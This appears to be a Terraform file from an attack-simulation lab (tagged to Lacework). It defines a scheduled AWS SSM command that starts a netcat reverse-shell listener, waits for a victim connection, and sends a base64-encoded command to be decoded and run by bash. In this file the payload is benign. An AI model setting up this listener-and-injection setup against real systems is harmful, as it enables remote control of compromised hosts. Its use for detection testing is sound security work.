locals {
    pid_path = "/var/run/nc_attacker"
    listen_port = var.listen_port
    listen_ip = var.listen_ip
    base64_payload = base64encode(
    <<-EOT
    touch /tmp/base64
    EOT
    )
}

resource "aws_ssm_document" "exec_reverse_shell_attacker" {
  name          = "exec_reverse_shell_attacker"
  document_type = "Command"

  content = jsonencode(
    {
        "schemaVersion": "2.2",
        "description": "exec reverse shell attacker",
        "mainSteps": [
            {
                "action": "aws:runShellScript",
                "name": "exec_reverse_shell_attacker",
                "precondition": {
                    "StringEquals": [
                        "platformType",
                        "Linux"
                    ]
                },
                "inputs": {
                    "timeoutSeconds": "600",
                    "runCommand": [
                        "echo \"Starting listener: ${local.listen_ip}:${local.listen_port}\" > /tmp/attacker_exec_reverseshell_listener.log",
                        "screen -ls | grep netcat | cut -d. -f1 | awk '{print $1}' | xargs kill",
                        "screen -d -L -Logfile /tmp/netcat.log -S netcat -m nc -vv -nl ${local.listen_ip} ${local.listen_port}",
                        "screen -S netcat -X colon \"logfile flush 0^M\"",
                        "echo \"Listener started..\" >> /tmp/attacker_exec_reverseshell_listener.log 2>&1 ",
                        "touch /tmp/attacker_exec_reverseshell_listener",
                        "until tail /tmp/netcat.log | grep -m 1 \"Connection received\"; do echo \"waiting for connection...\" >> /tmp/attacker_exec_reverseshell_listener.log; sleep 10; done",
                        "sleep 30",
                        "echo \"sending screen command...\" >> /tmp/attacker_exec_reverseshell_listener.log",
                        "screen -S netcat -p 0 -X stuff \"echo '${local.base64_payload}' | base64 -d | /bin/bash -^M\"",
                        "sleep 300"
                    ]
                    # 
                }
            }
        ]
    })
}

resource "aws_resourcegroups_group" "exec_reverse_shell_attacker" {
    name = "exec_reverse_shell_attacker"

    resource_query {
        query = jsonencode(var.resource_query_exec_reverse_shell_attacker)
    }

    tags = {
        billing = var.environment
        owner   = "lacework"
    }
}

resource "aws_ssm_association" "exec_reverse_shell_attacker" {
    association_name = "exec_reverse_shell_attacker"

    name = aws_ssm_document.exec_reverse_shell_attacker.name

    targets {
        key = "resource-groups:Name"
        values = [
            aws_resourcegroups_group.exec_reverse_shell_attacker.name,
        ]
    }

    compliance_severity = "HIGH"

    # every 30 minutes
    schedule_expression = "cron(0/30 * * * ? *)"
    
    # will apply when updated and interval when false
    apply_only_at_cron_interval = false
}